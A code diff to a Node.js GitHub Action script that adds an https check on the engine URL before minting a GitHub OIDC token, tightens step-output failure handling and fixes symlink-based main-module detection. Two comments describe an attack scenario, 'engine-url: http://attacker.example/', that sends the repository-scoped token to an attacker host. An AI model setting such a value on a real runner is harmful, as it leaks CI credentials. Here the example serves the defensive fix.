@@ -66,7 +66,7 @@
 // disk, and again per-file after unpacking. There is no flag that skips it. See
 // integrity.mjs, which is deliberately a separate, short, directly tested file.
 
-import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
 import { appendFileSync } from 'node:fs';
 import { dirname, join, resolve, sep } from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -144,23 +144,97 @@ export const ENGINE_AUDIENCE = 'https://backend.credda.io/v1/engine';
  *
  * The audience is a string compared against a set the verifier already accepts,
  * so moving it is safe the moment that set is deployed. This is a URL that must
- * ANSWER, and today it does not.
+ * ANSWER -- a different and stricter test, which is why the two do not move
+ * together. It DOES answer; the measurement is below, and the sentence that
+ * used to stand here saying it did not was left behind by its own update.
  *
  * Its home is `https://backend.credda.io/v1/engine`. The metering service has
  * been ported out of the Cloudflare Worker and into the Express backend that
- * already serves that hostname, so the code exists -- but it is not deployed,
- * and nginx does not yet pass `/v1/*` to it. Measured rather than assumed:
- * `POST https://backend.credda.io/v1/engine` answers 404 today.
+ * already serves that hostname.
  *
- * Pointing this default there now would not be a rename. It would be every
- * install on the next tag getting a 404, at the one step that can genuinely
- * stop a customer's build.
+ * THE PRECONDITION THIS PARAGRAPH SET HAS NOW BEEN MET, AND THE OLD
+ * MEASUREMENT IS SUPERSEDED. It read: "it is not deployed, and nginx does not
+ * yet pass `/v1/*` to it. Measured rather than assumed: `POST
+ * https://backend.credda.io/v1/engine` answers 404 today." That was true when
+ * written and is not true now. Re-measured 2026-08-28:
  *
- * This moves when that route exists and has been OBSERVED answering -- a 400
- * to an empty body proves the handler was reached; a 404 proves it was not --
- * and not before. Nothing about the audience change above depends on it.
+ *     POST https://backend.credda.io/v1/engine   (content-type json, body {})
+ *       -> 401, Server: nginx, and the METERING HANDLER'S OWN BODY:
+ *          {"ok":false,"error":"engine_unavailable","reason":"missing",
+ *           "message":"No GitHub OIDC token was presented. ... see the Credda README."}
+ *
+ *     POST https://backend.credda.io/v1/definitely-not-a-route
+ *       -> 404
+ *
+ * The control is what makes this evidence rather than a hopeful reading: a 404
+ * on a neighbouring path on the same host proves the 401 is a handler
+ * answering, not a catch-all. Re-measured again 2026-08-30: both
+ * `backend.credda.io/v1/engine` and the legacy `metering.codereef.app/v1/engine`
+ * still answer that same 401, each naming its own README. nginx passes `/v1/*` and the Express port is
+ * live. The test this paragraph named -- reached versus not reached -- is
+ * satisfied, and satisfied more strongly than the 400 it asked for.
+ *
+ * THE CONSTANT STILL DOES NOT MOVE IN THIS COMMIT, AND THE REASON IS NO LONGER
+ * THE ENDPOINT. Moving it means cutting a tag, and the deploy order below is
+ * not symmetric. What is unverified is the other half: the published `v1` tag
+ * requests the LEGACY audience (`metering.codereef.app/v1/engine`) and fetches
+ * from the legacy host, so the fleet is self-consistent and working today. The
+ * audience move above exists only on this branch, unreleased. Before any tag
+ * carrying it is published, the DEPLOYED verifier on whichever host the fetch
+ * targets must be confirmed to accept `https://backend.credda.io/v1/engine` --
+ * against the running service, not the repository. That cannot be checked
+ * without minting a GitHub OIDC token, so it is a release step and not a
+ * reading exercise.
+ *
+ * The standing risk while this stays on the legacy value: every install in the
+ * fleet fetches its engine from a Cloudflare Worker that the port exists to
+ * retire. Turning that Worker off breaks every install at the one step that
+ * genuinely stops a customer's build. This is now a sequencing decision rather
+ * than a blocked one.
  */
 export const DEFAULT_ENGINE_URL = 'https://metering.codereef.app/v1/engine';
+
+/**
+ * Why `engine-url` is checked BEFORE a token is minted, and not after.
+ *
+ * `mintIdToken` produces a GitHub-signed OIDC assertion scoped to the calling
+ * repository, and `download` sends it to whatever `engine-url` names. Until
+ * this existed the value was tested only for emptiness, so
+ * `engine-url: http://attacker.example/` on a customer's runner posted that
+ * token to an arbitrary host in cleartext.
+ *
+ * The digest verification further down is not a mitigation for this. It stops
+ * an unverified archive from EXECUTING, which is a different property; it
+ * cannot un-send a credential that left before it ran. Ordering is the control:
+ * refuse the endpoint first, mint second.
+ *
+ * https is required rather than encouraged. Over http the assertion is readable
+ * by anything on the path, and no legitimate deployment fetches the engine over
+ * plaintext. The HOST is deliberately left open -- self-hosted and staging
+ * endpoints are supported, and it is the audience claim in `mintIdToken` that
+ * binds the token to a service permitted to accept it, not an allowlist here.
+ *
+ * Returns the refusal message, or `null` when the URL is acceptable. Split out
+ * from `main` so it can be exercised directly; this repository has no test
+ * runner yet, and a security control that cannot be called in isolation is one
+ * nobody checks.
+ */
+export function engineUrlRefusal(endpoint) {
+  let parsed;
+  try {
+    parsed = new URL(endpoint);
+  } catch {
+    return `engine-url is not a valid URL: ${endpoint}`;
+  }
+  if (parsed.protocol !== 'https:') {
+    return (
+      `engine-url must use https, but it is ${parsed.protocol} (${endpoint}). ` +
+      'Credda mints a repository-scoped OIDC token to authenticate this fetch and ' +
+      'will not send it over a plaintext connection.'
+    );
+  }
+  return null;
+}
 
 /** Largest archive accepted, in bytes. The real one is about a megabyte. */
 const MAX_ARCHIVE_BYTES = 32 * 1024 * 1024;
@@ -397,9 +471,29 @@ export function materialise(archive, lock, targetDir) {
 
 /* --------------------------------- the job -------------------------------- */
 
+/**
+ * Writes a step output, or refuses.
+ *
+ * IT USED TO SKIP WHEN `GITHUB_OUTPUT` WAS ABSENT, and that was the one place
+ * in this file where something failing turned into something that reads like
+ * success. `engine-root` is how the next step is told where the verified engine
+ * is; unwritten, it is the empty string, and the log still ends with "Engine
+ * v0.1.1 verified ... and unpacked to /...". The job then dies in run.mjs
+ * saying the action manifest must be broken -- which would be a wrong answer to
+ * a customer, about a file that is fine, on a run whose real fault was here.
+ *
+ * So it fails, and `run.mjs` has always failed on the same missing variable.
+ * Two scripts in one job now hold one policy rather than opposite ones.
+ */
 function output(name, value) {
   const file = process.env['GITHUB_OUTPUT'];
-  if (file) appendFileSync(file, `${name}=${value}\n`, 'utf8');
+  if (!file) {
+    fail(
+      `GITHUB_OUTPUT is not set, so Credda cannot tell the next step where it put the verified engine (${name}). ` +
+        'This script only runs inside a GitHub Actions job.',
+    );
+  }
+  appendFileSync(file, `${name}=${value}\n`, 'utf8');
 }
 
 async function main() {
@@ -460,6 +554,23 @@ async function main() {
       );
     }
 
+    // Validate the endpoint BEFORE minting anything. The token below is a
+    // GitHub-signed OIDC assertion scoped to the caller's repository, and
+    // `download` sends it to whatever `endpoint` names. Until this check
+    // existed, `engine-url: http://attacker.example/` on a customer's runner
+    // handed that token to an arbitrary host in cleartext -- the digest
+    // verification further down stops unverified code from EXECUTING, but it
+    // cannot un-send a credential that was posted before it ran.
+    //
+    // https is required rather than merely recommended: over http the token is
+    // readable by anything on the path, and there is no legitimate deployment
+    // of this action that fetches its engine over plaintext. Host is left open
+    // on purpose -- self-hosted and staging endpoints are supported, and the
+    // audience check in `mintIdToken` is what binds the token to a service
+    // that is allowed to accept it.
+    const refusal = engineUrlRefusal(endpoint);
+    if (refusal !== null) fail(refusal);
+
     let token;
     try {
       token = await mintIdToken();
@@ -501,7 +612,30 @@ async function main() {
 
 // Run only when executed, so the tests can import `materialise` and `download`
 // without the file trying to mint a token.
-if (process.argv[1] && resolve(process.argv[1]) === resolve(fileURLToPath(import.meta.url))) {
+//
+// COMPARED BY REAL PATH, AND THAT IS THE WHOLE OF THIS FUNCTION. Node resolves
+// the main module through its symlinks before it sets `import.meta.url`, and
+// does not resolve `process.argv[1]`. So on any runner where the path
+// `action.yml` interpolates -- `$GITHUB_ACTION_PATH` -- passes through a
+// symlink, the two strings differ, this condition is false, and NOTHING RUNS:
+// no download, no verification, no output, no message, and the step exits 0.
+// The job then dies in `run.mjs` blaming the action manifest, which is a wrong
+// answer to a customer about a file that is fine. Measured: invoking this file
+// through a symlinked directory exited 0 having done nothing. Resolving both
+// sides the same way is what makes "did not run" impossible to confuse with
+// "ran and succeeded".
+function isMainModule() {
+  const real = (path) => {
+    try {
+      return realpathSync(path);
+    } catch {
+      return resolve(path);
+    }
+  };
+  return real(process.argv[1]) === real(fileURLToPath(import.meta.url));
+}
+
+if (process.argv[1] && isMainModule()) {
   try {
     await main();
   } catch (error) {
